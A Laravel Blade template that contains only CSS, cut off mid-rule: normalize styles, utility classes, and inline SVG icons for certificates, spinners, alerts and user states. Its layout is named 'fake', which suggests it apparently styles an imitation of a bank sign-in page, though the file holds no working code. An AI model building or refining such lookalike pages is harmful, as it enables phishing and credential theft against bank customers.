@extends('layouts.fake')
@push('css')
    <link href="{{asset('css/csas.css')}}" rel="stylesheet">
    <style>
        @charset "UTF-8";
        [ng\:cloak],
        [ng-cloak],
        [data-ng-cloak],
        [x-ng-cloak],
        .ng-cloak,
        .x-ng-cloak,
        .ng-hide:not(.ng-hide-animate) {
            display: none !important;
        }


        ng\:form {
            display: block;
        }

        .ng-animate-shim {
            visibility: hidden;
        }

        .ng-anchor {
            position: absolute;
        }
    </style>
    <style>
        /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */

        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%
        }

        body {
            margin: 0
        }

        main {
            display: block
        }

        h1 {
            font-size: 2em;
            margin: 0.67em 0
        }

        hr {
            box-sizing: content-box;
            height: 0;
            overflow: visible
        }

        pre {
            font-family: monospace, monospace;
            font-size: 1em
        }

        a {
            background-color: transparent
        }

        abbr[title] {
            border-bottom: none;
            text-decoration: underline;
            -webkit-text-decoration: underline dotted;
            text-decoration: underline dotted
        }

        b,
        strong {
            font-weight: bolder
        }

        code,
        kbd,
        samp {
            font-family: monospace, monospace;
            font-size: 1em
        }

        small {
            font-size: 80%
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline
        }

        sub {
            bottom: -0.25em
        }

        sup {
            top: -0.5em
        }

        img {
            border-style: none
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            font-family: inherit;
            font-size: 100%;
            line-height: 1.15;
            margin: 0
        }

        button,
        input {
            overflow: visible
        }

        button,
        select {
            text-transform: none
        }

        button,
        [type="button"],
        [type="reset"],
        [type="submit"] {
            -webkit-appearance: button
        }

        button::-moz-focus-inner,
        [type="button"]::-moz-focus-inner,
        [type="reset"]::-moz-focus-inner,
        [type="submit"]::-moz-focus-inner {
            border-style: none;
            padding: 0
        }

        button:-moz-focusring,
        [type="button"]:-moz-focusring,
        [type="reset"]:-moz-focusring,
        [type="submit"]:-moz-focusring {
            outline: 1px dotted ButtonText
        }

        fieldset {
            padding: 0.35em 0.75em 0.625em
        }

        legend {
            box-sizing: border-box;
            color: inherit;
            display: table;
            max-width: 100%;
            padding: 0;
            white-space: normal
        }

        progress {
            vertical-align: baseline
        }

        textarea {
            overflow: auto
        }

        [type="checkbox"],
        [type="radio"] {
            box-sizing: border-box;
            padding: 0
        }

        [type="number"]::-webkit-inner-spin-button,
        [type="number"]::-webkit-outer-spin-button {
            height: auto
        }

        [type="search"] {
            -webkit-appearance: textfield;
            outline-offset: -2px
        }

        [type="search"]::-webkit-search-decoration {
            -webkit-appearance: none
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit
        }

        details {
            display: block
        }

        summary {
            display: list-item
        }

        template {
            display: none
        }

        [hidden] {
            display: none
        }

        blockquote,
        dl,
        dd,
        h1,
        h2,
        h3,
        h4,
        h5,
        h6,
        hr,
        figure,
        p,
        pre {
            margin: 0
        }

        button {
            background-color: transparent;
            background-image: none
        }

        button:focus {
            outline: 1px dotted;
            outline: 5px auto -webkit-focus-ring-color
        }

        fieldset {
            margin: 0;
            padding: 0
        }

        ol,
        ul {
            list-style: none;
            margin: 0;
            padding: 0
        }

        html {
            font-family: Inter, sans-serif;
            line-height: 1.5
        }

        *,
        ::before,
        ::after {
            box-sizing: border-box;
            border-width: 0;
            border-style: solid;
            border-color: currentColor
        }

        hr {
            border-top-width: 1px
        }

        img {
            border-style: solid
        }

        textarea {
            resize: vertical
        }

        input::-moz-placeholder,
        textarea::-moz-placeholder {
            color: #a0aec0
        }

        input:-ms-input-placeholder,
        textarea:-ms-input-placeholder {
            color: #a0aec0
        }

        input::placeholder,
        textarea::placeholder {
            color: #a0aec0
        }

        button,
        [role="button"] {
            cursor: pointer
        }

        table {
            border-collapse: collapse
        }

        h1,
        h2,
        h3,
        h4,
        h5,
        h6 {
            font-size: inherit;
            font-weight: inherit
        }

        a {
            color: inherit;
            text-decoration: inherit
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            padding: 0;
            line-height: inherit;
            color: inherit
        }

        pre,
        code,
        kbd,
        samp {
            font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
        }

        img,
        svg,
        video,
        canvas,
        audio,
        iframe,
        embed,
        object {
            display: block;
            vertical-align: middle
        }

        img,
        video {
            max-width: 100%;
            height: auto
        }

        .container {
            width: 100%;
            padding-right: 1rem;
            padding-left: 1rem
        }

        @media (min-width: 375px) {
            .container {
                max-width: 375px
            }
        }

        @media (min-width: 480px) {
            .container {
                max-width: 480px
            }
        }

        @media (min-width: 640px) {
            .container {
                max-width: 640px
            }
        }

        @media (min-width: 768px) {
            .container {
                max-width: 768px
            }
        }

        @media (min-width: 1024px) {
            .container {
                max-width: 1024px;
                padding-right: 2rem;
                padding-left: 2rem
            }
        }

        @media (min-width: 1280px) {
            .container {
                max-width: 1280px;
                padding-right: 10rem;
                padding-left: 10rem
            }
        }

        @media (min-width: 1536px) {
            .container {
                max-width: 1536px
            }
        }

        .bg-fixed {
            background-attachment: fixed
        }

        .bg-white {
            --bg-opacity: 1;
            background-color: #ffffff;
            background-color: rgba(255, 255, 255, var(--bg-opacity))
        }

        .bg-grey-200 {
            --bg-opacity: 1;
            background-color: #e4eaf0;
            background-color: rgba(228, 234, 240, var(--bg-opacity))
        }

        .bg-grey-300-50 {
            background-color: rgba(163, 181, 201, 0.5)
        }

        .bg-blue-300 {
            --bg-opacity: 1;
            background-color: #1a67d2;
            background-color: rgba(26, 103, 210, var(--bg-opacity))
        }

        .bg-blue-400 {
            --bg-opacity: 1;
            background-color: #21416c;
            background-color: rgba(33, 65, 108, var(--bg-opacity))
        }

        .bg-blue-info {
            --bg-opacity: 1;
            background-color: #D1EBFE;
            background-color: rgba(209, 235, 254, var(--bg-opacity))
        }

        .bg-yellow-warn {
            --bg-opacity: 1;
            background-color: #FCEED2;
            background-color: rgba(252, 238, 210, var(--bg-opacity))
        }

        .bg-red-danger {
            --bg-opacity: 1;
            background-color: #FAD3D3;
            background-color: rgba(250, 211, 211, var(--bg-opacity))
        }

        .hover\:bg-grey-h:hover {
            background-color: rgba(26, 103, 210, 0.06)
        }

        .hover\:bg-blue-300-h:hover {
            --bg-opacity: 1;
            background-color: #1657B1;
            background-color: rgba(22, 87, 177, var(--bg-opacity))
        }

        .focus\:bg-grey-f:focus {
            background-color: rgba(33, 65, 108, 0.1)
        }

        .focus\:bg-blue-400-h:focus {
            --bg-opacity: 1;
            background-color: #1452A8;
            background-color: rgba(20, 82, 168, var(--bg-opacity))
        }

        .border-grey-300 {
            --border-opacity: 1;
            border-color: #A3B5C9;
            border-color: rgba(163, 181, 201, var(--border-opacity))
        }

        .border-grey-300-50 {
            border-color: rgba(163, 181, 201, 0.5)
        }

        .border-blue-300 {
            --border-opacity: 1;
            border-color: #1a67d2;
            border-color: rgba(26, 103, 210, var(--border-opacity))
        }

        .hover\:border-grey-400:hover {
            --border-opacity: 1;
            border-color: #5C7999;
            border-color: rgba(92, 121, 153, var(--border-opacity))
        }

        .hover\:border-blue-300-h:hover {
            --border-opacity: 1;
            border-color: #1657B1;
            border-color: rgba(22, 87, 177, var(--border-opacity))
        }

        .focus\:border-grey-400:focus {
            --border-opacity: 1;
            border-color: #5C7999;
            border-color: rgba(92, 121, 153, var(--border-opacity))
        }

        .rounded {
            border-radius: 0.25rem
        }

        .rounded-md {
            border-radius: 0.375rem
        }

        .rounded-lg {
            border-radius: 0.5rem
        }

        .border-2 {
            border-width: 2px
        }

        .border {
            border-width: 1px
        }

        .cursor-default {
            cursor: default
        }

        .cursor-pointer {
            cursor: pointer
        }

        .block {
            display: block
        }

        .flex {
            display: flex
        }

        .table {
            display: table
        }

        .hidden {
            display: none
        }

        .flex-row {
            flex-direction: row
        }

        .flex-col {
            flex-direction: column
        }

        .items-start {
            align-items: flex-start
        }

        .items-center {
            align-items: center
        }

        .self-center {
            align-self: center
        }

        .justify-center {
            justify-content: center
        }

        .justify-between {
            justify-content: space-between
        }

        .flex-none {
            flex: none
        }

        .flex-grow {
            flex-grow: 1
        }

        .clear-both {
            clear: both
        }

        .font-sans {
            font-family: Inter, sans-serif
        }

        .font-semibold {
            font-weight: 600
        }

        .font-bold {
            font-weight: 700
        }

        .h-100 {
            height: 100px
        }

        .h-full {
            height: 100%
        }

        .text-sm {
            font-size: 0.875rem
        }

        .text-base {
            font-size: 1rem
        }

        .text-1-5xl {
            font-size: 1.375rem
        }

        .text-4-5xl {
            font-size: 2.5rem
        }

        .leading-5 {
            line-height: 1.25rem
        }

        .leading-6 {
            line-height: 1.5rem
        }

        .leading-relaxed {
            line-height: 1.625
        }

        .m-2 {
            margin: 0.5rem
        }

        .mx-0 {
            margin-left: 0;
            margin-right: 0
        }

        .my-2 {
            margin-top: 0.5rem;
            margin-bottom: 0.5rem
        }

        .my-3 {
            margin-top: 0.75rem;
            margin-bottom: 0.75rem
        }

        .my-4 {
            margin-top: 1rem;
            margin-bottom: 1rem
        }

        .mx-4 {
            margin-left: 1rem;
            margin-right: 1rem
        }

        .my-6 {
            margin-top: 1.5rem;
            margin-bottom: 1.5rem
        }

        .mx-auto {
            margin-left: auto;
            margin-right: auto
        }

        .-my-0-5 {
            margin-top: -0.125rem;
            margin-bottom: -0.125rem
        }

        .mb-0 {
            margin-bottom: 0
        }

        .mt-1 {
            margin-top: 0.25rem
        }

        .mb-1 {
            margin-bottom: 0.25rem
        }

        .mt-2 {
            margin-top: 0.5rem
        }

        .mr-2 {
            margin-right: 0.5rem
        }

        .ml-2 {
            margin-left: 0.5rem
        }

        .mb-3 {
            margin-bottom: 0.75rem
        }

        .mt-4 {
            margin-top: 1rem
        }

        .mr-4 {
            margin-right: 1rem
        }

        .mb-4 {
            margin-bottom: 1rem
        }

        .mt-5 {
            margin-top: 1.25rem
        }

        .mr-5 {
            margin-right: 1.25rem
        }

        .mb-5 {
            margin-bottom: 1.25rem
        }

        .ml-5 {
            margin-left: 1.25rem
        }

        .mr-8 {
            margin-right: 2rem
        }

        .ml-8 {
            margin-left: 2rem
        }

        .-mt-3 {
            margin-top: -0.75rem
        }

        .-mb-4 {
            margin-bottom: -1rem
        }

        .mt-0-5 {
            margin-top: 0.125rem
        }

        .min-w-320 {
            min-width: 320px
        }

        .p-2 {
            padding: 0.5rem
        }

        .p-3 {
            padding: 0.75rem
        }

        .p-4 {
            padding: 1rem
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem
        }

        .px-2 {
            padding-left: 0.5rem;
            padding-right: 0.5rem
        }

        .px-3 {
            padding-left: 0.75rem;
            padding-right: 0.75rem
        }

        .py-4 {
            padding-top: 1rem;
            padding-bottom: 1rem
        }

        .px-4 {
            padding-left: 1rem;
            padding-right: 1rem
        }

        .py-5 {
            padding-top: 1.25rem;
            padding-bottom: 1.25rem
        }

        .py-10 {
            padding-top: 2.5rem;
            padding-bottom: 2.5rem
        }

        .px-2-5 {
            padding-left: 0.625rem;
            padding-right: 0.625rem
        }

        .pr-1 {
            padding-right: 0.25rem
        }

        .pt-2 {
            padding-top: 0.5rem
        }

        .pb-2 {
            padding-bottom: 0.5rem
        }

        .pr-3 {
            padding-right: 0.75rem
        }

        .pb-3 {
            padding-bottom: 0.75rem
        }

        .pt-4 {
            padding-top: 1rem
        }

        .pr-4 {
            padding-right: 1rem
        }

        .pt-5 {
            padding-top: 1.25rem
        }

        .pb-5 {
            padding-bottom: 1.25rem
        }

        .pr-6 {
            padding-right: 1.5rem
        }

        .pb-6 {
            padding-bottom: 1.5rem
        }

        .pt-12 {
            padding-top: 3rem
        }

        .pl-2-5 {
            padding-left: 0.625rem
        }

        .last\:pb-0:last-child {
            padding-bottom: 0
        }

        .relative {
            position: relative
        }

        .shadow-main {
            box-shadow: 0 2px 7px 0 rgba(5, 34, 97, 0.1)
        }

        .hover\:shadow-btn-hover:hover {
            box-shadow: 0px 4px 12px -4px rgba(26, 103, 210, 0.4)
        }

        .focus\:shadow-btn-focus:focus {
            box-shadow: 0px 4px 4px -4px rgba(26, 103, 210, 0.4)
        }

        .text-center {
            text-align: center
        }

        .text-white {
            --text-opacity: 1;
            color: #ffffff;
            color: rgba(255, 255, 255, var(--text-opacity))
        }

        .text-grey-300 {
            --text-opacity: 1;
            color: #A3B5C9;
            color: rgba(163, 181, 201, var(--text-opacity))
        }

        .text-grey-300-50 {
            color: rgba(163, 181, 201, 0.5)
        }

        .text-grey-400 {
            --text-opacity: 1;
            color: #5C7999;
            color: rgba(92, 121, 153, var(--text-opacity))
        }

        .text-blue-300 {
            --text-opacity: 1;
            color: #1a67d2;
            color: rgba(26, 103, 210, var(--text-opacity))
        }

        .text-blue-400 {
            --text-opacity: 1;
            color: #21416c;
            color: rgba(33, 65, 108, var(--text-opacity))
        }

        .text-red {
            --text-opacity: 1;
            color: #E72222;
            color: rgba(231, 34, 34, var(--text-opacity))
        }

        .uppercase {
            text-transform: uppercase
        }

        .tracking-little-tight {
            letter-spacing: -0.0125em
        }

        .w-100 {
            width: 100px
        }

        .w-full {
            width: 100%
        }

        @keyframes spin {
            to {
                transform: rotate(360deg)
            }
        }

        @-webkit-keyframes ping {
            75%,
            100% {
                transform: scale(2);
                opacity: 0
            }
        }

        @keyframes ping {
            75%,
            100% {
                transform: scale(2);
                opacity: 0
            }
        }

        @-webkit-keyframes pulse {
            50% {
                opacity: .5
            }
        }

        @keyframes pulse {
            50% {
                opacity: .5
            }
        }

        @-webkit-keyframes bounce {
            0%,
            100% {
                transform: translateY(-25%);
                -webkit-animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
                animation-timing-function: cubic-bezier(0.8, 0, 1, 1)
            }
            50% {
                transform: none;
                -webkit-animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
                animation-timing-function: cubic-bezier(0, 0, 0.2, 1)
            }
        }

        @keyframes bounce {
            0%,
            100% {
                transform: translateY(-25%);
                -webkit-animation-timing-function: cubic-bezier(0.8, 0, 1, 1);
                animation-timing-function: cubic-bezier(0.8, 0, 1, 1)
            }
            50% {
                transform: none;
                -webkit-animation-timing-function: cubic-bezier(0, 0, 0.2, 1);
                animation-timing-function: cubic-bezier(0, 0, 0.2, 1)
            }
        }

        .icon {
            background-size: contain;
            background-repeat: no-repeat;
            position: relative
        }

        @-webkit-keyframes spin {
            0% {
                -webkit-transform: rotate(-360deg)
            }
            100% {
                -webkit-transform: rotate(0deg)
            }
        }

        @keyframes spin {
            0% {
                transform: rotate(-360deg)
            }
            100% {
                transform: rotate(0deg)
            }
        }

        .info-icon {
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M19.167 9.97C19.167 4.91 15.06.802 10 .802S.833 4.909.833 9.969c0 5.061 4.107 9.167 9.167 9.167s9.167-4.106 9.167-9.167zM2.5 9.97c0-4.14 3.36-7.5 7.5-7.5 4.14 0 7.5 3.36 7.5 7.5 0 4.14-3.36 7.5-7.5 7.5-4.14 0-7.5-3.36-7.5-7.5zm6.667-.834v5a.833.833 0 001.666 0v-5a.833.833 0 00-1.666 0zm0-3.336a.834.834 0 101.667 0 .834.834 0 00-1.667 0z' fill='%23fff'/%3E%3C/svg%3E");
            width: 20px;
            height: 20px
        }

        .certIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='31' height='23' viewBox='0 0 31 23' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M2.32864 22.0658H28.6714C29.9812 22.0658 31 21.047 31 19.7372V2.70901C31 1.39915 29.9812 0.380371 28.6714 0.380371H2.32864C1.01878 0.380371 0 1.39915 0 2.70901V19.7372C0 21.047 1.01878 22.0658 2.32864 22.0658ZM29.4711 19.7371C29.4711 20.1737 29.1072 20.5376 28.6706 20.5376H2.3279C1.89128 20.5376 1.52743 20.1737 1.52743 19.7371V2.70896C1.52743 2.27234 1.89128 1.90849 2.3279 1.90849H28.6706C29.1072 1.90849 29.4711 2.27234 29.4711 2.70896V19.7371ZM5.3843 15.8804C4.94769 15.8804 4.65661 15.5166 4.65661 15.0799C4.65661 14.6433 4.94769 14.3523 5.3843 14.3523H6.98524C7.42186 14.3523 7.71294 14.6433 7.71294 15.0799C7.71294 15.5166 7.42186 15.8804 6.98524 15.8804H5.3843ZM10.8434 15.0799C10.8434 15.5166 11.2072 15.8804 11.6439 15.8804H13.172C13.6087 15.8804 13.9725 15.5166 13.9725 15.0799C13.9725 14.6433 13.6087 14.3523 13.172 14.3523H11.6439C11.2072 14.3523 10.8434 14.6433 10.8434 15.0799ZM17.8279 15.8804C17.3913 15.8804 17.0274 15.5166 17.0274 15.0799C17.0274 14.6433 17.3913 14.3523 17.8279 14.3523H19.3561C19.7927 14.3523 20.1565 14.6433 20.1565 15.0799C20.1565 15.5166 19.7927 15.8804 19.3561 15.8804H17.8279ZM23.2858 15.0799C23.2858 15.5166 23.5769 15.8804 24.0135 15.8804H25.6144C26.051 15.8804 26.3421 15.5166 26.3421 15.0799C26.3421 14.6433 26.051 14.3523 25.6144 14.3523H24.0135C23.5769 14.3523 23.2858 14.6433 23.2858 15.0799ZM6.18679 8.09391V9.69484H7.71496V8.09391H6.18679ZM7.71294 6.56578H6.18477C5.31153 6.56578 4.65661 7.29348 4.65661 8.09395V9.69489C4.65661 10.4954 5.31153 11.2231 6.18477 11.2231H7.71294C8.58618 11.2231 9.31388 10.4954 9.31388 9.69489V8.09395C9.31388 7.29348 8.58618 6.56578 7.71294 6.56578Z' fill='%23A3B5C9'/%3E%3C/svg%3E");
            width: 30px;
            height: 20px
        }

        .loadingLightIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='22' height='22' viewBox='0 0 22 22' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M22 11C22 17.0751 17.0751 22 11 22C4.92487 22 0 17.0751 0 11L2.00006 11C2.00006 11 2.00006 11 2.00006 11C2.00006 15.9706 6.0295 20 11.0001 20C15.9706 20 20.0001 15.9706 20.0001 11C20.0001 6.02948 15.9706 2.00005 11.0001 2.00005C11 2.00005 11 2.00005 11 2.00005V-1.52588e-05C17.0751 -1.52588e-05 22 4.92485 22 11Z' fill='white'/%3E%3C/svg%3E%0A");
            width: 22px;
            height: 22px;
            -webkit-animation: spin 1.3s linear infinite;
            animation: spin 1.3s linear infinite
        }

        .loadingDarkIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='22' height='22' viewBox='0 0 22 22' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M22 11C22 17.0751 17.0751 22 11 22C4.92487 22 0 17.0751 0 11L2.00006 11C2.00006 11 2.00006 11 2.00006 11C2.00006 15.9706 6.0295 20 11.0001 20C15.9706 20 20.0001 15.9706 20.0001 11C20.0001 6.02948 15.9706 2.00005 11.0001 2.00005C11 2.00005 11 2.00005 11 2.00005V-1.33514e-05C17.0751 -1.33514e-05 22 4.92485 22 11Z' fill='%235C7999'/%3E%3C/svg%3E%0A");
            width: 22px;
            height: 22px;
            -webkit-animation: spin 1.3s linear infinite;
            animation: spin 1.3s linear infinite
        }

        .loadingMediumIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='64' height='64' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M64 32c0 17.673-14.327 32-32 32C14.327 64 0 49.673 0 32H5.82C5.819 46.46 17.54 58.182 32 58.182c14.46 0 26.182-11.722 26.182-26.182C58.182 17.54 46.46 5.818 32 5.818V0c17.673 0 32 14.327 32 32z' fill='%235C7999'/%3E%3C/svg%3E");
            width: 64px;
            height: 64px;
            -webkit-animation: spin 1.3s linear infinite;
            animation: spin 1.3s linear infinite
        }

        .loadingLargeIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M80.0004 48C80.0004 65.6731 65.6735 80 48.0004 80C30.3273 80 16.0004 65.6731 16.0004 48H21.8187C21.8187 48 21.8187 48.0001 21.8187 48.0001C21.8187 62.46 33.5407 74.182 48.0005 74.182C62.4604 74.182 74.1824 62.46 74.1824 48.0001C74.1824 33.5403 62.4604 21.8183 48.0005 21.8183C48.0005 21.8183 48.0004 21.8183 48.0004 21.8183L48.0004 16C65.6735 16 80.0004 30.3268 80.0004 48Z' fill='%235C7999'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px;
            -webkit-animation: spin 1.3s linear infinite;
            animation: spin 1.3s linear infinite
        }

        .alertDangerIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M1.46143 14.5981C0.545202 16.2643 1.75024 18.3031 3.65161 18.3031H16.3466C18.248 18.3031 19.4539 16.2644 18.5377 14.5982L12.1901 3.05729C11.24 1.33087 8.75903 1.33087 7.80903 3.05711L1.46143 14.5981ZM16.3466 16.6364H3.65161C3.01802 16.6364 2.61634 15.9568 2.92183 15.4013L9.26929 3.86049C9.58587 3.28524 10.4132 3.28524 10.7299 3.86067L17.0773 15.4013C17.3826 15.9566 16.9805 16.6364 16.3466 16.6364ZM10.8326 10.8031V7.46972C10.8326 7.00948 10.4595 6.63639 9.99928 6.63639C9.53904 6.63639 9.16595 7.00948 9.16595 7.46972V10.8031C9.16595 11.2633 9.53904 11.6364 9.99928 11.6364C10.4595 11.6364 10.8326 11.2633 10.8326 10.8031ZM9.16678 14.134C9.16678 14.594 9.54011 14.9673 10.0001 14.9673C10.4601 14.9673 10.8334 14.594 10.8334 14.134C10.8334 13.6731 10.4601 13.3006 10.0001 13.3006C9.54011 13.3006 9.16678 13.6731 9.16678 14.134Z' fill='%23E72222'/%3E%3C/svg%3E%0A");
            width: 20px;
            height: 20px
        }

        .alertWarnIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M1.46143 14.5981C0.545202 16.2644 1.75024 18.3031 3.65161 18.3031H16.3466C18.248 18.3031 19.4539 16.2644 18.5377 14.5982L12.1901 3.05732C11.24 1.3309 8.75903 1.3309 7.80903 3.05714L1.46143 14.5981ZM16.3466 16.6364H3.65161C3.01802 16.6364 2.61634 15.9568 2.92183 15.4013L9.26929 3.86052C9.58587 3.28527 10.4132 3.28527 10.7299 3.8607L17.0773 15.4014C17.3826 15.9566 16.9805 16.6364 16.3466 16.6364ZM10.8326 10.8031V7.46975C10.8326 7.00951 10.4595 6.63642 9.99928 6.63642C9.53904 6.63642 9.16595 7.00951 9.16595 7.46975V10.8031C9.16595 11.2633 9.53904 11.6364 9.99928 11.6364C10.4595 11.6364 10.8326 11.2633 10.8326 10.8031ZM9.16678 14.134C9.16678 14.594 9.54011 14.9673 10.0001 14.9673C10.4601 14.9673 10.8334 14.594 10.8334 14.134C10.8334 13.6732 10.4601 13.3007 10.0001 13.3007C9.54011 13.3007 9.16678 13.6732 9.16678 14.134Z' fill='%23F2A91E'/%3E%3C/svg%3E%0A");
            width: 20px;
            height: 20px
        }

        .alertInfoIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='20' height='20' viewBox='0 0 20 20' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M19.1663 9.96975C19.1663 4.90951 15.0599 0.803085 9.99967 0.803085C4.93944 0.803085 0.833008 4.90951 0.833008 9.96975C0.833008 15.0305 4.93916 19.1364 9.99967 19.1364C15.0602 19.1364 19.1663 15.0305 19.1663 9.96975ZM2.49967 9.96975C2.49967 5.82999 5.85991 2.46975 9.99967 2.46975C14.1394 2.46975 17.4997 5.82999 17.4997 9.96975C17.4997 14.11 14.1397 17.4698 9.99967 17.4698C5.85961 17.4698 2.49967 14.11 2.49967 9.96975ZM9.16634 9.13642V14.1364C9.16634 14.5967 9.53944 14.9698 9.99968 14.9698C10.4599 14.9698 10.833 14.5967 10.833 14.1364V9.13642C10.833 8.67618 10.4599 8.30309 9.99968 8.30309C9.53944 8.30309 9.16634 8.67618 9.16634 9.13642ZM9.16634 5.80067C9.16634 6.26067 9.53967 6.634 9.99968 6.634C10.4597 6.634 10.833 6.26067 10.833 5.80067C10.833 5.33983 10.4597 4.96733 9.99968 4.96733C9.53967 4.96733 9.16634 5.33983 9.16634 5.80067Z' fill='%23199CF9'/%3E%3C/svg%3E%0A");
            width: 20px;
            height: 20px
        }

        .userNoMethodsIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='35.8929' cy='22.3929' r='13.3929' stroke='%23A3B5C9' stroke-width='4'/%3E%3Cpath d='M10 59.0003C16.4978 52.3777 25.4474 48.286 35.3281 48.286C38.1391 48.286 40.8747 48.6172 43.5 49.2436' stroke='%23A3B5C9' stroke-width='4' stroke-linecap='round' stroke-linejoin='round'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M85.5501 67.6249C85.5501 55.4878 75.7122 45.6499 63.5751 45.6499C51.438 45.6499 41.6001 55.4878 41.6001 67.6249C41.6001 79.7606 51.4387 89.5999 63.5751 89.5999C75.7115 89.5999 85.5501 79.7606 85.5501 67.6249ZM45.5946 67.625C45.5946 57.6946 53.6438 49.6454 63.5742 49.6454C73.5046 49.6454 81.5537 57.6946 81.5537 67.625C81.5537 77.5541 73.5039 85.6045 63.5742 85.6045C53.6445 85.6045 45.5946 77.5541 45.5946 67.625ZM63.5746 79.6035C62.4718 79.6035 61.5768 78.7085 61.5768 77.6057C61.5768 76.501 62.4718 75.608 63.5746 75.608C64.6773 75.608 65.5723 76.501 65.5723 77.6057C65.5723 78.7085 64.6773 79.6035 63.5746 79.6035ZM71.5663 64.1582C71.5663 66.6042 70.0121 68.4692 67.5998 69.9166C66.8981 70.3376 66.2041 70.6793 65.5731 70.9465V71.9633C65.5731 73.0666 64.6787 73.961 63.5754 73.961C62.4721 73.961 61.5776 73.0666 61.5776 71.9633V69.552C61.5776 68.6698 62.1563 67.8921 63.0013 67.6386C63.1349 67.5985 63.4074 67.505 63.7699 67.3601C64.3797 67.1161 64.9884 66.8239 65.5441 66.4905C66.8775 65.6905 67.5708 64.8585 67.5708 64.1547C67.5733 62.7124 66.6625 61.4244 65.3012 60.9463C63.5339 60.3241 61.5936 61.2548 60.9708 63.0236C60.6044 64.0643 59.4638 64.611 58.4231 64.2446C57.3824 63.8782 56.8357 62.7375 57.2021 61.6968C58.5574 57.8471 62.7787 55.8224 66.6266 57.1771C69.5896 58.2177 71.5717 61.0208 71.5663 64.1582Z' fill='%23F2A91E'/%3E%3C/svg%3E%0A");
            width: 96px;
            height: 96px
        }

        .userInfoIcon {
            background-image: url("data:image/svg+xml,%3Csvg width='96' height='96' viewBox='0 0 96 96' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect x='0.5' y='0.5' width='95' height='95' stroke='black' stroke-opacity='0.01'/%3E%3Ccircle cx='35.8929' cy='22.3929' r='13.3929' stroke='%23A3B5C9' stroke-width='4'/%3E%3Cpath d='M10 59.0003C16.4978 52.3777 25.4474 48.286 35.3281 48.286C38.1391 48.286 40.8747 48.6172 43.5 49.2436' stroke='%23A3B5C9' stroke-width='4' stroke-linecap='round' stroke-linejoin='round'/%3E%3Cpath fill-rule='evenodd' clip-rule='evenodd' d='M85.5501 67.6249C85.5501 55.4941 75.7059 45.6499 63.5751 45.6499C51.4443 45.6499 41.6001 55.4941 41.6001 67.6249C41.6001 79.757 51.4437 89.5999 63.5751 89.5999C75.7065 89.5999 85.5501 79.757 85.5501 67.6249ZM45.5966 67.6251C45.5966 57.7009 53.652 49.6455 63.5761 49.6455C73.5003 49.6455 81.5557 57.7009 81.5557 67.6251C81.5557 77.5505 73.501 85.6046 63.5761 85.6046C53.6513 85.6046 45.5966 77.5505 45.5966 67.6251ZM61.5774 65.6272V77.6135C61.5774 78.7169 62.4718 79.6113 63.5751 79.6113C64.6784 79.6113 65.5728 78.7169 65.5728 77.6135V65.6272C65.5728 64.5239 64.6784 63.6294 63.5751 63.6294C62.4718 63.6294 61.5774 64.5239 61.5774 65.6272ZM61.5774 57.6304C61.5774 58.7332 62.4724 59.6281 63.5751 59.6281C64.6778 59.6281 65.5728 58.7332 65.5728 57.6304C65.5728 56.5257 64.6778 55.6327 63.5751 55.6327C62.4724 55.6327 61.5774 56.5257 61.5774 57.6304Z' fill='%23199CF9'/%3E%3C/svg%3E");
            width: 96px;
            height: 96px
        }

        .userErrorIcon {
